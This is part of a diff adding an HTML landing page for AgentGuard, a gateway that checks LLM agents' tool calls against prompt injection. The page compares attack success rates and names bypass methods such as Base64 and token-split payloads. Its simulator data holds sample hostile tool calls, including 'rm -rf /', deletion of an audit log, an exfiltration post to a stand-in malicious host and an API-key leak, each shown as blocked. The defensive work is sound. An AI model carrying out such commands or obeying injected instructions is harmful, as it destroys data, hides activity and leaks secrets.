+        </p>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
+        
+        <!-- Config A: Raw Agent -->
+        <div class="bg-white p-7 rounded-2xl shadow-sm text-center border border-gray-200/80">
+          <span class="font-mono text-xs text-gray-500 font-semibold uppercase">Config A // Raw Agent</span>
+          <div class="text-5xl font-extrabold text-error my-3">80.0%</div>
+          <div class="text-base font-bold text-on-surface">Attack Success Rate</div>
+          <p class="text-xs text-gray-500 mt-2 leading-relaxed">
+            No firewall. LLM agent accepts prompt-injected instructions and invokes exfiltration tools unconditionally.
+          </p>
+          <div class="mt-4 pt-4 border-t border-gray-100 font-mono text-xs text-gray-500">
+            Avg Latency: 900ms
+          </div>
+        </div>
+
+        <!-- Config B: Filter Only -->
+        <div class="bg-white p-7 rounded-2xl shadow-sm text-center border border-gray-200/80">
+          <span class="font-mono text-xs text-gray-500 font-semibold uppercase">Config B // Text Filter Only</span>
+          <div class="text-5xl font-extrabold text-orange-500 my-3">40.0%</div>
+          <div class="text-base font-bold text-on-surface">Attack Success Rate</div>
+          <p class="text-xs text-gray-500 mt-2 leading-relaxed">
+            Standard semantic injection detection. Obfuscated Base64, token-split, and multi-turn payloads routinely bypass detection.
+          </p>
+          <div class="mt-4 pt-4 border-t border-gray-100 font-mono text-xs text-gray-500">
+            Avg Latency: 940ms
+          </div>
+        </div>
+
+        <!-- Config C: AgentGuard Full Stack -->
+        <div class="bg-white p-7 rounded-2xl shadow-md text-center ring-2 ring-primary relative overflow-hidden">
+          <div class="absolute top-3 right-3 px-2 py-0.5 bg-primary text-white rounded font-mono text-[10px] font-bold">
+            AGENTGUARD L7
+          </div>
+          <span class="font-mono text-xs text-primary font-bold uppercase">Config C // Full AgentGuard Stack</span>
+          <div class="text-5xl font-extrabold text-primary my-3">0.0%</div>
+          <div class="text-base font-bold text-on-surface">Attack Success Rate (Zero Bypass)</div>
+          <p class="text-xs text-gray-500 mt-2 leading-relaxed">
+            Full deterministic pipeline: Ingress Taint Tracking + Precedence Decider + Destination Regex Whitelist + DLP Scanner.
+          </p>
+          <div class="mt-4 pt-4 border-t border-gray-100 font-mono text-xs text-primary font-semibold">
+            Avg Latency: 914ms (+14.2ms proxy overhead)
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ================= FOOTER ================= -->
+  <footer class="bg-white border-t border-gray-100 py-10">
+    <div class="max-w-7xl mx-auto px-6 flex flex-col md:flex-row items-center justify-between gap-6">
+      <div class="flex items-center gap-3">
+        <div class="w-8 h-8 rounded-lg bg-primary text-white flex items-center justify-center font-bold text-sm">
+          AG
+        </div>
+        <div>
+          <span class="font-bold text-sm text-on-surface">AgentGuard (AASG)</span>
+          <span class="text-xs text-gray-500 block">Deterministic Layer-7 Agent Security Gateway</span>
+        </div>
+      </div>
+
+      <div class="flex items-center gap-6 text-xs text-gray-600 font-medium">
+        <a href="http://localhost:8501" target="_blank" class="hover:text-primary transition-colors">Security Dashboard</a>
+        <a href="/docs" target="_blank" class="hover:text-primary transition-colors">Swagger API</a>
+        <a href="https://github.com/GowithKeya/AASG" target="_blank" class="hover:text-primary transition-colors">GitHub Repository</a>
+      </div>
+
+      <div class="text-xs text-gray-400 font-mono">
+        © 2026 AgentGuard Architecture • Zero Telemetry Leaks
+      </div>
+    </div>
+  </footer>
+
+  <!-- ================= THREE.JS BACKGROUND INTERACTIVE ANIMATION SCRIPT ================= -->
+  <script>
+    (function initThreeAnimation() {
+      const container = document.getElementById('hero-canvas-container');
+      const canvas = document.getElementById('three-canvas');
+      if (!container || !canvas || typeof THREE === 'undefined') return;
+
+      const scene = new THREE.Scene();
+
+      // Camera
+      const camera = new THREE.PerspectiveCamera(
+        50,
+        container.clientWidth / container.clientHeight,
+        0.1,
+        1000
+      );
+      camera.position.z = 24;
+
+      // Renderer
+      const renderer = new THREE.WebGLRenderer({
+        canvas: canvas,
+        alpha: true,
+        antialias: true,
+        powerPreference: 'high-performance'
+      });
+      renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+      renderer.setSize(container.clientWidth, container.clientHeight);
+
+      // 1. Cyber Security Shield (Geodesic Geometries)
+      const shieldGroup = new THREE.Group();
+      scene.add(shieldGroup);
+      shieldGroup.position.set(6, 0, 0); // Positioned slightly to the right side of hero content
+
+      // Outer Icosahedron Wireframe
+      const outerGeo = new THREE.IcosahedronGeometry(7, 2);
+      const outerMat = new THREE.MeshBasicMaterial({
+        color: 0xff5e1f,
+        wireframe: true,
+        transparent: true,
+        opacity: 0.22
+      });
+      const outerShield = new THREE.Mesh(outerGeo, outerMat);
+      shieldGroup.add(outerShield);
+
+      // Inner Core (Pulsing Security Kernel)
+      const coreGeo = new THREE.IcosahedronGeometry(3.8, 1);
+      const coreMat = new THREE.MeshBasicMaterial({
+        color: 0xff8a50,
+        wireframe: true,
+        transparent: true,
+        opacity: 0.45
+      });
+      const coreShield = new THREE.Mesh(coreGeo, coreMat);
+      shieldGroup.add(coreShield);
+
+      // Orbiting Torus Rings (Packet Inspection Rings)
+      const torusGeo = new THREE.TorusGeometry(8.5, 0.05, 8, 80);
+      const torusMat = new THREE.MeshBasicMaterial({
+        color: 0xff5e1f,
+        transparent: true,
+        opacity: 0.35
+      });
+      const ring1 = new THREE.Mesh(torusGeo, torusMat);
+      ring1.rotation.x = Math.PI / 3;
+      shieldGroup.add(ring1);
+
+      const ring2 = new THREE.Mesh(torusGeo, torusMat);
+      ring2.rotation.y = Math.PI / 4;
+      shieldGroup.add(ring2);
+
+      // 2. Swarm of Network Packet Particles
+      const particleCount = 200;
+      const particleGeo = new THREE.BufferGeometry();
+      const posArray = new Float32Array(particleCount * 3);
+      const colorArray = new Float32Array(particleCount * 3);
+
+      const orange = new THREE.Color(0xff5e1f);
+      const teal = new THREE.Color(0x10b981);
+      const lightOrange = new THREE.Color(0xffaa77);
+
+      for (let i = 0; i < particleCount * 3; i += 3) {
+        posArray[i] = (Math.random() - 0.5) * 35;
+        posArray[i + 1] = (Math.random() - 0.5) * 25;
+        posArray[i + 2] = (Math.random() - 0.5) * 20;
+
+        const c = Math.random() > 0.4 ? (Math.random() > 0.5 ? orange : lightOrange) : teal;
+        colorArray[i] = c.r;
+        colorArray[i + 1] = c.g;
+        colorArray[i + 2] = c.b;
+      }
+
+      particleGeo.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
+      particleGeo.setAttribute('color', new THREE.BufferAttribute(colorArray, 3));
+
+      // Particle Material
+      const particleMat = new THREE.PointsMaterial({
+        size: 0.16,
+        vertexColors: true,
+        transparent: true,
+        opacity: 0.75
+      });
+
+      const particleSystem = new THREE.Points(particleGeo, particleMat);
+      scene.add(particleSystem);
+
+      // 3. Smooth Mouse Damping Interaction
+      let mouseX = 0;
+      let mouseY = 0;
+      let targetX = 0;
+      let targetY = 0;
+
+      window.addEventListener('mousemove', (e) => {
+        const windowHalfX = window.innerWidth / 2;
+        const windowHalfY = window.innerHeight / 2;
+        mouseX = (e.clientX - windowHalfX) * 0.0006;
+        mouseY = (e.clientY - windowHalfY) * 0.0006;
+      });
+
+      // Responsive Resize
+      window.addEventListener('resize', () => {
+        if (!container) return;
+        const width = container.clientWidth;
+        const height = container.clientHeight;
+        camera.aspect = width / height;
+        camera.updateProjectionMatrix();
+        renderer.setSize(width, height);
+        
+        // Adjust shield position on small screens
+        if (width < 768) {
+          shieldGroup.position.set(0, 0, -5);
+        } else {
+          shieldGroup.position.set(6, 0, 0);
+        }
+      });
+
+      if (window.innerWidth < 768) {
+        shieldGroup.position.set(0, 0, -5);
+      }
+
+      // Animation Loop
+      let clock = new THREE.Clock();
+
+      function animate() {
+        requestAnimationFrame(animate);
+
+        const elapsedTime = clock.getElapsedTime();
+
+        // Smooth Mouse Lerp
+        targetX += (mouseX - targetX) * 0.05;
+        targetY += (mouseY - targetY) * 0.05;
+
+        // Rotate Shield
+        shieldGroup.rotation.y = elapsedTime * 0.15 + targetX * 3;
+        shieldGroup.rotation.x = Math.sin(elapsedTime * 0.2) * 0.1 + targetY * 2;
+
+        // Inner Core counter rotation & gentle pulse
+        coreShield.rotation.y = -elapsedTime * 0.25;
+        coreShield.rotation.z = elapsedTime * 0.1;
+        const pulse = 1 + Math.sin(elapsedTime * 2) * 0.04;
+        coreShield.scale.set(pulse, pulse, pulse);
+
+        // Orbit Rings
+        ring1.rotation.z = elapsedTime * 0.2;
+        ring2.rotation.x = elapsedTime * 0.18;
+
+        // Subtle Particle Drift
+        particleSystem.rotation.y = elapsedTime * 0.03;
+        particleSystem.rotation.x = Math.sin(elapsedTime * 0.05) * 0.05;
+
+        renderer.render(scene, camera);
+      }
+
+      animate();
+    })();
+
+    // ================= INTERACTIVE SIMULATOR LOGIC =================
+    const ruleData = {
+      1: {
+        call: 'ToolCall(name="bash_exec", args={"cmd": "rm -rf /"})',
+        state: 'session.tainted = False, seen_confidential = False',
+        test: 'call.name in policy.allowed_tools? -> FALSE',
+        lat: 'Evaluation latency: 0.12ms',
+        verdict: 'BLOCK',
+        verdictClass: 'text-error',
+        reason: 'reason="permission_denied"'
+      },
+      2: {
+        call: 'ToolCall(name="delete_file", args={"path": "/var/log/audit.log"})',
+        state: 'session.tainted = False, seen_confidential = False',
+        test: 'call.name in policy.always_require_approval? -> TRUE',
+        lat: 'Evaluation latency: 0.19ms',
+        verdict: 'NEEDS_APPROVAL',
+        verdictClass: 'text-primary',
+        reason: 'reason="always_require_approval"'
+      },
+      3: {
+        call: 'ToolCall(name="http_post", args={"url": "https://malicious.ru/exfil", "body": "dump"})',
+        state: 'session.tainted = False, seen_confidential = False',
+        test: 'is_whitelisted(url, allowed_destinations)? -> FALSE',
+        lat: 'Evaluation latency: 0.31ms',
+        verdict: 'BLOCK',
+        verdictClass: 'text-error',
+        reason: 'reason="destination_not_allowed"'
+      },
+      4: {
+        call: 'ToolCall(name="send_webhook", args={"target_url": "https://whitelisted.corp/hook", "body": "API_KEY_9921"})',
+        state: 'session.tainted = True, seen_confidential = False',
+        test: 'session.tainted AND dlp_scanner.find_leaks(args)? -> TRUE',
+        lat: 'Evaluation latency: 0.44ms',
+        verdict: 'BLOCK',
+        verdictClass: 'text-error',
+        reason: 'reason="leak_while_tainted"'
+      },
+      5: {
+        call: 'ToolCall(name="send_webhook", args={"target_url": "https://whitelisted.corp/hook", "body": "Summary report"})',
+        state: 'session.tainted = True, seen_confidential = True',
+        test: 'sink AND session.tainted AND seen_confidential? -> TRUE',
+        lat: 'Evaluation latency: 0.28ms',
+        verdict: 'NEEDS_APPROVAL',
+        verdictClass: 'text-primary',
+        reason: 'reason="untrusted_influence_on_sink"'
+      },
+      6: {
+        call: 'ToolCall(name="read_knowledge_base", args={"query": "return policy 2026"})',
+        state: 'session.tainted = False, seen_confidential = False',
+        test: 'All checks passed safely -> PASS',
+        lat: 'Evaluation latency: 0.15ms',
+        verdict: 'ALLOW',
+        verdictClass: 'text-emerald-500',
+        reason: 'reason="default_allow"'
+      }
+    };
+
+    function selectRule(ruleNumber) {
+      const data = ruleData[ruleNumber];
+      if (!data) return;
+
+      for (let i = 1; i <= 6; i++) {
+        const card = document.getElementById('rule-card-' + i);
+        if (card) {
+          if (i === ruleNumber) {
+            card.classList.add('ring-2', 'ring-primary', 'shadow-md');
+          } else {
+            card.classList.remove('ring-2', 'ring-primary', 'shadow-md');
+          }
+        }
+      }
+
+      document.getElementById('sim-status').innerText = 'SHOWING PRECEDENCE RULE 0' + ruleNumber + ' TRACE';
+      document.getElementById('sim-call').innerText = data.call;
+      document.getElementById('sim-state').innerText = data.state;
+      document.getElementById('sim-test').innerText = data.test;
+      document.getElementById('sim-lat').innerText = data.lat;
+
+      const vEl = document.getElementById('sim-verdict');
+      vEl.innerText = data.verdict;
+      vEl.className = 'text-2xl font-bold my-1 ' + data.verdictClass;
+
+      document.getElementById('sim-reason').innerText = data.reason;
+    }
+  </script>
+</body>
+</html>
